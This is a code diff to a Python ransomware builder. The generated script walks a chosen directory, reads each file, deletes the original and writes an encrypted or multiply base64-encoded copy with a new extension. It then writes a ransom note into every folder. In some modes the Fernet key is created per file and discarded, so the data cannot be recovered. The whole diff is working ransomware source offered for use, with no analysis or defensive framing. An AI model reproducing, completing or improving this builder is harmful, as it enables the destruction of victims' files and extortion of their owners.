@@ -114,150 +114,23 @@ File Extension: {code_1}
 code_12 = 'print("Ransomware Runing Done!!!!!!")'
 
 if code_2 == 'Fernet_ReEncryption':
-    file_code = f"""
-import os
-from cryptography.fernet import Fernet
-
-{code_11}
-
-# Scan Files
-def scan(path):
-    allFiles = []
-    for home, sub_files, file_list_s in os.walk(path):
-        for name_files in file_list_s:
-            if '{code_1}' in name_files:
-                continue
-            allFiles.append(os.path.join(home, name_files))
-    return allFiles
-
-#Path Files
-path_files = {code_path}
-
-#Encryption
-num = 0
-openFiles = scan(path_files)
-for file_os in openFiles:
-     #Read Files
-     files = open(file_os, "rb")
-     Data_Text = files.read()
-     files.close()
-
-     #Files Remove 
-     os.remove(file_os)
-     
-     # Fernet
+    loader_encrypt = 'print("SKIP ENCRYPTION FERNET")'
+    code_encrypt = f'''# FERNET
      key_fernet_start = Fernet.generate_key()
      fernet_start = Fernet(key_fernet_start)
      encodedBytes = fernet_start.encrypt(Data_Text)
-     encodedStr = str(encodedBytes,'utf-8')
-     
-     # Write Files
-     output = os.path.join(os.path.dirname(file_os), os.path.basename(file_os) + '{code_1}')
-     files2 = open(output, "w")
-     files2.write(encodedStr)
-     num += 1
-
-# Note
-num2 = 0
-for dirName, subdirList, fileList in os.walk(path_files):
-    OutputFile = os.path.join(os.path.join(dirName),f"{code_3}.txt")
-    file = open(OutputFile,'w')
-    file.write('''{Note_Text_Infection}''')
-    file.close()
-    num2 += 1
-
-{code_12}
-"""
+     encodedStr = str(encodedBytes,"utf-8")'''
 
 if code_2 == 'Fernet':
-    file_code = f"""
-import os
-from cryptography.fernet import Fernet
-
-{code_11}
-
-# Scan Files
-def scan(path):
-    allFiles = []
-    for home, sub_files, file_list_s in os.walk(path):
-        for name_files in file_list_s:
-            if '{code_1}' in name_files:
-                continue
-            allFiles.append(os.path.join(home, name_files))
-    return allFiles
-
-#Path Files
-path_files = {code_path}
-key_fernet_start = Fernet.generate_key()
-
-#Encryption
-num = 0
-openFiles = scan(path_files)
-for file_os in openFiles:
-     #Read Files
-     files = open(file_os, "rb")
-     Data_Text = files.read()
-     files.close()
-
-     #Files Remove 
-     os.remove(file_os)
-     
-     # Fernet
+    loader_encrypt = "key_fernet_start = Fernet.generate_key()"
+    code_encrypt = f'''# Fernet
      fernet_start = Fernet(key_fernet_start)
      encodedBytes = fernet_start.encrypt(Data_Text)
-     encodedStr = str(encodedBytes,'utf-8')
-     
-     # Write Files
-     output = os.path.join(os.path.dirname(file_os), os.path.basename(file_os) + '{code_1}')
-     files2 = open(output, "w")
-     files2.write(encodedStr)
-     num += 1
-
-# Note
-num2 = 0
-for dirName, subdirList, fileList in os.walk(path_files):
-    OutputFile = os.path.join(os.path.join(dirName),f"{code_3}.txt")
-    file = open(OutputFile,'w')
-    file.write('''{Note_Text_Infection}''')
-    file.close()
-    num2 += 1
-
-{code_12}
-"""
+     encodedStr = str(encodedBytes,"utf-8")'''
 
 if code_2 == 'base':
-    file_code = f"""
-import os
-import base64
-
-{code_11}
-
-# Scan Files
-def scan(path):
-    allFiles = []
-    for home, sub_files, file_list_s in os.walk(path):
-        for name_files in file_list_s:
-            if '{code_1}' in name_files:
-                continue
-            allFiles.append(os.path.join(home, name_files))
-    return allFiles
-
-#Path Files
-path_files = {code_path}
-
-#Encryption
-num = 0
-openFiles = scan(path_files)
-for file_os in openFiles:
-     #Read Files
-     files = open(file_os, "rb")
-     Data_Text = files.read()
-     files.close()
-
-     #Files Remove 
-     os.remove(file_os)
-     
-     # Base Encryption
+    loader_encrypt = 'print("SKIP ENCRYPTION FERNET")'
+    code_encrypt = f'''# Base Encryption
      encodedBytes = base64.b16encode(bytes(Data_Text))
      encodedBytes = base64.b32hexencode(bytes(encodedBytes))
      encodedBytes = base64.b32encode(bytes(encodedBytes))
@@ -266,61 +139,11 @@ for file_os in openFiles:
      encodedBytes = base64.b32hexencode(bytes(encodedBytes))
      encodedBytes = base64.b85encode(bytes(encodedBytes))
      encodedBytes = base64.b32hexencode(bytes(encodedBytes))
-     encodedStr = str(encodedBytes,'utf-8')
-     
-     # Write Files
-     output = os.path.join(os.path.dirname(file_os), os.path.basename(file_os) + '{code_1}')
-     files2 = open(output, "w")
-     files2.write(encodedStr)
-     num += 1
-
-# Note
-num2 = 0
-for dirName, subdirList, fileList in os.walk(path_files):
-    OutputFile = os.path.join(os.path.join(dirName),f"{code_3}.txt")
-    file = open(OutputFile,'w')
-    file.write('''{Note_Text_Infection}''')
-    file.close()
-    num2 += 1
-
-{code_12}
-"""
+     encodedStr = str(encodedBytes,"utf-8")'''
 
 if code_2 == 'Fernet_base':
-    file_code = f"""
-import os
-import base64
-from cryptography.fernet import Fernet
-
-{code_11}
-
-# Scan Files
-def scan(path):
-    allFiles = []
-    for home, sub_files, file_list_s in os.walk(path):
-        for name_files in file_list_s:
-            if '{code_1}' in name_files:
-                continue
-            allFiles.append(os.path.join(home, name_files))
-    return allFiles
-
-#Path Files
-path_files = {code_path}
-key_fernet_start = Fernet.generate_key()
-
-#Encryption
-num = 0
-openFiles = scan(path_files)
-for file_os in openFiles:
-     #Read Files
-     files = open(file_os, "rb")
-     Data_Text = files.read()
-     files.close()
-
-     #Files Remove 
-     os.remove(file_os)
-     
-     # Base Encryption
+    loader_encrypt = "key_fernet_start = Fernet.generate_key()"
+    code_encrypt = f'''# Base Encryption
      fernet_start = Fernet(key_fernet_start)
      encodedBytes = fernet_start.encrypt(Data_Text)
      encodedBytes = base64.b16encode(bytes(encodedBytes))
@@ -331,61 +154,12 @@ for file_os in openFiles:
      encodedBytes = base64.b32hexencode(bytes(encodedBytes))
      encodedBytes = base64.b85encode(bytes(encodedBytes))
      encodedBytes = base64.b32hexencode(bytes(encodedBytes))
-     encodedStr = str(encodedBytes,'utf-8')
-     
-     # Write Files
-     output = os.path.join(os.path.dirname(file_os), os.path.basename(file_os) + '{code_1}')
-     files2 = open(output, "w")
-     files2.write(encodedStr)
-     num += 1
-
-# Note
-num2 = 0
-for dirName, subdirList, fileList in os.walk(path_files):
-    OutputFile = os.path.join(os.path.join(dirName),f"{code_3}.txt")
-    file = open(OutputFile,'w')
-    file.write('''{Note_Text_Infection}''')
-    file.close()
-    num2 += 1
-
-{code_12}
-"""
+     encodedStr = str(encodedBytes,"utf-8")'''
 
 
 if code_2 == 'Fernet_ReEncryption_base':
-    file_code = f"""
-import os
-import base64
-from cryptography.fernet import Fernet
-
-{code_11}
-
-# Scan Files
-def scan(path):
-    allFiles = []
-    for home, sub_files, file_list_s in os.walk(path):
-        for name_files in file_list_s:
-            if '{code_1}' in name_files:
-                continue
-            allFiles.append(os.path.join(home, name_files))
-    return allFiles
-
-#Path Files
-path_files = {code_path}
-
-#Encryption
-num = 0
-openFiles = scan(path_files)
-for file_os in openFiles:
-     #Read Files
-     files = open(file_os, "rb")
-     Data_Text = files.read()
-     files.close()
-
-     #Files Remove 
-     os.remove(file_os)
-     
-     # Base Encryption
+    loader_encrypt = 'print("SKIP ENCRYPTION FERNET")'
+    code_encrypt = f'''# Base Encryption
      key_fernet_start = Fernet.generate_key()
      fernet_start = Fernet(key_fernet_start)
      encodedBytes = fernet_start.encrypt(Data_Text)
@@ -397,7 +171,44 @@ for file_os in openFiles:
      encodedBytes = base64.b32hexencode(bytes(encodedBytes))
      encodedBytes = base64.b85encode(bytes(encodedBytes))
      encodedBytes = base64.b32hexencode(bytes(encodedBytes))
-     encodedStr = str(encodedBytes,'utf-8')
+     encodedStr = str(encodedBytes,"utf-8")'''
+
+
+file_code = f"""
+import os
+import base64
+from cryptography.fernet import Fernet
+
+{code_11}
+
+# Scan Files
+def scan(path):
+    allFiles = []
+    for home, sub_files, file_list_s in os.walk(path):
+        for name_files in file_list_s:
+            if '{code_1}' in name_files:
+                continue
+            allFiles.append(os.path.join(home, name_files))
+    return allFiles
+
+#Path Files
+path_files = {code_path}
+
+{loader_encrypt}
+
+#Encryption
+num = 0
+openFiles = scan(path_files)
+for file_os in openFiles:
+     #Read Files
+     files = open(file_os, "rb")
+     Data_Text = files.read()
+     files.close()
+
+     #Files Remove 
+     os.remove(file_os)
+     
+     {code_encrypt}
      
      # Write Files
      output = os.path.join(os.path.dirname(file_os), os.path.basename(file_os) + '{code_1}')
@@ -414,8 +225,8 @@ for dirName, subdirList, fileList in os.walk(path_files):
     file.close()
     num2 += 1
 
-{code_12}
-"""
+{code_12}"""
+
 print("Write Name Files (Not Enter End with .py)")
 Name_Files = input("Ransomware Files Name:")
 file_ransom = open(Name_Files + '.py','w')
